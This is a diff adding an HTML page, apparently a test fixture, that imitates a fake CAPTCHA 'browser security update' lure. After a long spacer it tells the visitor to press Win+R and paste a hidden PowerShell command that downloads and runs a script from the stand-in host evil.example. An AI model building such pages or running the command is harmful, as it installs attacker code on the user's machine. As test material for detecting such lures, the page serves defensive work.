@@ -1,0 +1,38 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Long page verification</title>
+    <style>
+      body { font-family: Arial, sans-serif; margin: 0; background: #0b1120; color: #e5e7eb; }
+      main { max-width: 900px; margin: 0 auto; padding: 48px 20px; }
+      .spacer { height: 1800px; background: linear-gradient(#111827, #0b1120); border-radius: 24px; margin: 24px 0; }
+      pre { background: #020617; padding: 16px; border-radius: 12px; white-space: pre-wrap; }
+      button { padding: 12px 18px; border-radius: 10px; border: 0; background: #ef4444; color: white; }
+    </style>
+  </head>
+  <body>
+    <main>
+      <h1>Browser security update required</h1>
+      <p>Scroll to the end to continue the anti-bot verification.</p>
+      <div class="spacer"></div>
+      <section class="verify-card" data-clipboard="powershell -nop -w hidden -c irm https://evil.example/long.ps1 | iex">
+        <h2>Verify you are human</h2>
+        <p>Press Win+R, paste the command below, then press Enter to continue.</p>
+        <canvas title="captcha verification image" width="320" height="120"></canvas>
+        <pre>powershell -nop -w hidden -c "irm https://evil.example/long.ps1 | iex"</pre>
+        <button data-copy="powershell -nop -w hidden -c irm https://evil.example/long.ps1 | iex">Copy command</button>
+      </section>
+    </main>
+    <script>
+      const canvas = document.querySelector('canvas');
+      const ctx = canvas.getContext('2d');
+      ctx.fillStyle = '#111827';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = '#f8fafc';
+      ctx.font = '24px Arial';
+      ctx.fillText('CAPTCHA verification', 30, 62);
+    </script>
+  </body>
+</html>
